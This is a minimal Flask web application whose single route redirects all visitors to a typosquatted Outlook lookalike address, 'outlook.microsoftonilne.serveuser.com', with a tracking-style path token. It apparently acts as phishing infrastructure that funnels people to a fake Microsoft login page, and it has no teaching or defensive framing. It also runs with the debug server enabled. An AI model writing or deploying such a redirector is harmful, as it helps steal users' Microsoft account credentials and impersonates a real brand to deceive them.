from flask import Flask, render_template, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return redirect("https://outlook.microsoftonilne.serveuser.com/cIgAxmdV")

if __name__ == '__main__':
    app.run(debug=True)
